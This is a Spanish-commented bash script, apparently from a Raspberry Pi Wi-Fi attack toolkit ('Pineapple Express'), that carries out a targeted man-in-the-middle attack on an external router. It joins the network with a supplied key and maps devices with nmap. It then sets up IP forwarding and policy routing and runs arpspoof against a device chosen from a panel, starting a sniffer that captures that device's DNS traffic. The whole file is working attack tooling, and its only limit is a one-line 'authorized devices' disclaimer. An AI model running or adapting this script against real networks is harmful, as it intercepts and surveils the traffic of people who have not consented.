#!/bin/bash
DIR="${DIR:-$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)}"
[ -f "$DIR/.env" ] && . "$DIR/.env"
AP_IF="${AP_IF:-wlan0}"
MON_IF="${MON_IF:-wlan1}"
# Pineapple Express - MITM contra router EXTERNO (la Pi = cliente del router + ARP-spoof DIRIGIDO).
# Lee mitm-ready (BSSID+KEY del router), asocia $MON_IF, descubre los dispositivos de la red,
# y cuando el panel selecciona un target (mitm-target) hace ARP-spoof SOLO a ese device + sniff.
# Una sola radio ($MON_IF): mientras corre, Kismet queda parado y se restaura al salir.
# USE ONLY on your own network / authorized devices.
set -u

BASE=/opt/pinacola
READY="$BASE/mitm-ready"
STATE="$BASE/mitm-attack.state"
DEVICES="$BASE/mitm-devices.txt"
TARGET="$BASE/mitm-target"
FEED="$BASE/mitm-feed.log"
INFO="$BASE/mitm-info"            # SSID|IP|GW|SUBNET de la sesion (para el panel)
SNIFF="$BASE/mitm-sniff.sh"
IF=$MON_IF
RT=100

# --- instancia unica: varios motores compiten por $MON_IF = caos. Antes del trap,
#     para que salir por el lock NO dispare cleanup (que desasociaria al motor legitimo). ---
exec 9>/tmp/mitm-router.lock
if ! flock -n 9; then
  echo "[motor] ya hay una instancia corriendo, saliendo." >&2
  exit 0
fi

ts(){ date +%H:%M:%S; }
setstate(){ echo "$1" > "$STATE"; }
feed(){ echo "[$(ts)] $*" >> "$FEED"; tail -200 "$FEED" > "$FEED.tmp" 2>/dev/null && mv "$FEED.tmp" "$FEED"; }

cleanup(){
  pkill -f "arpspoof -i $IF" 2>/dev/null
  pkill -f "tcpdump -i $IF" 2>/dev/null
  pkill -f "mitm-sniff.sh" 2>/dev/null
  ip rule del table $RT 2>/dev/null
  ip route flush table $RT 2>/dev/null
  echo 1 > /proc/sys/net/ipv4/conf/$IF/send_redirects 2>/dev/null
  nmcli dev disconnect $IF 2>/dev/null
  nmcli dev set $IF managed no 2>/dev/null
  ip link set $IF down 2>/dev/null
  iw dev $IF set type monitor 2>/dev/null
  ip link set $IF up 2>/dev/null
  systemctl start kismet-sensor.service 2>/dev/null
  rm -f "$TARGET" "$DEVICES" "$INFO"
  setstate stopped
}
trap cleanup EXIT INT TERM

: > "$FEED"
rm -f "$TARGET" "$DEVICES" "$INFO"
setstate starting

# --- leer mitm-ready ---
BSSID=$(sed -n 's/^BSSID=//p' "$READY" 2>/dev/null | head -1)
KEY=$(sed -n 's/^KEY=//p' "$READY" 2>/dev/null | head -1)
if ! echo "$BSSID" | grep -qiE '^([0-9a-f]{2}:){5}[0-9a-f]{2}$' || [ "${#KEY}" -lt 8 ]; then
  feed "X mitm-ready invalido (hace falta BSSID valido + KEY de >=8). Mete target y key en el panel."
  setstate stopped; exit 1
fi

# --- liberar $MON_IF de Kismet y ponerlo managed ---
feed "Liberando $MON_IF de Kismet..."
systemctl stop kismet-sensor.service 2>/dev/null
pkill -9 -f kismet_cap_linux_wifi 2>/dev/null
sleep 1
nmcli dev set $IF managed yes 2>/dev/null
ip link set $IF down 2>/dev/null
iw dev $IF set type managed 2>/dev/null
ip link set $IF up 2>/dev/null
sleep 1

# --- asociar al router. Un perfil NM corrupto del SSID rompe el connect
#     ("key-mgmt property is missing") -> limpiar perfiles wifi previos primero.
#     $MON_IF es solo para auditar; la Pi no usa wifi-client persistente. ---
feed "Asociando $MON_IF -> $BSSID ..."
nmcli -t -f NAME,TYPE con show 2>/dev/null | grep wireless | cut -d: -f1 \
  | while read -r n; do nmcli con delete "$n" 2>/dev/null; done
nmcli dev wifi rescan ifname $IF 2>/dev/null
sleep 4
nmcli dev wifi connect "$BSSID" password "$KEY" ifname $IF >/dev/null 2>&1

# poll del DHCP hasta ~12s (la asociacion L2 es rapida, el lease tarda)
GW=""
for _ in $(seq 1 12); do
  GW=$(ip route show dev $IF 2>/dev/null | sed -n 's/^default via \([0-9.]*\).*/\1/p' | head -1)
  [ -n "$GW" ] && break
  sleep 1
done
if ! iw dev $IF link 2>/dev/null | grep -qi 'Connected' || [ -z "$GW" ]; then
  feed "X No se asocio/DHCP a $BSSID. Causas: KEY incorrecta, 5GHz ($MON_IF solo 2.4), o fuera de alcance."
  setstate stopped; exit 1
fi

SSID=$(iw dev $IF link 2>/dev/null | sed -n 's/^[[:space:]]*SSID: //p' | head -1)
IP=$(ip -4 addr show $IF 2>/dev/null | sed -n 's/.*inet \([0-9.]*\).*/\1/p' | head -1)
SUBNET=$(ip -4 route show dev $IF 2>/dev/null | grep -v default | sed -n 's@^\([0-9./]*\) .*@\1@p' | head -1)
if [ -z "$SUBNET" ]; then
  feed "X Asociado pero sin subred. Abortando."
  setstate stopped; exit 1
fi
printf 'SSID=%s\nIP=%s\nGW=%s\nSUBNET=%s\n' "$SSID" "$IP" "$GW" "$SUBNET" > "$INFO"
feed "Asociado a '$SSID' (ip $IP, gw $GW). Descubriendo dispositivos en $SUBNET..."

# --- policy routing: el trafico reenviado de la victima sale por $MON_IF al router (no bucle por eth0) ---
sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1
echo 0 > /proc/sys/net/ipv4/conf/$IF/send_redirects 2>/dev/null
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects 2>/dev/null
ip route flush table $RT 2>/dev/null
ip route add default via "$GW" dev $IF table $RT 2>/dev/null

setstate associated

# --- descubrir dispositivos (nmap -sn: IP + MAC + fabricante; hostname si hay PTR) ---
discover(){
  nmap -sn "$SUBNET" -e $IF 2>/dev/null | awk -v me="$IP" '
    /Nmap scan report for/{
      if ($0 ~ /\(/){ name=$5; ip=$NF; gsub(/[()]/,"",ip) }
      else { name=""; ip=$NF }
    }
    /MAC Address:/{
      mac=$3
      vend=$0; sub(/^.*MAC Address:[[:space:]]*[0-9A-Fa-f:]+[[:space:]]*/,"",vend)
      gsub(/[()]/,"",vend)
      if (ip != me) print ip"|"mac"|"vend"|"name
      ip=""; name=""
    }
  ' > "$DEVICES.tmp" 2>/dev/null
  [ -f "$DEVICES.tmp" ] && mv "$DEVICES.tmp" "$DEVICES"
}

# --- bucle principal: re-descubre + aplica target si el panel selecciona uno ---
LAST_TARGET=""
while :; do
  discover
  T=$(grep -oE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$TARGET" 2>/dev/null | head -1)
  if [ -n "$T" ] && [ "$T" != "$LAST_TARGET" ]; then
    pkill -f "arpspoof -i $IF" 2>/dev/null
    pkill -f "mitm-sniff.sh" 2>/dev/null
    ip rule del table $RT 2>/dev/null
    ip rule add from "$T" table $RT priority $RT 2>/dev/null
    nohup arpspoof -i $IF -t "$T" -r "$GW" >/dev/null 2>&1 &
    nohup bash "$SNIFF" "$T" "$FEED" >/dev/null 2>&1 &
    feed "ARP-spoof DIRIGIDO a $T (via gw $GW). Esnifando su DNS en vivo..."
    LAST_TARGET="$T"
    setstate running
  fi
  sleep 15
done
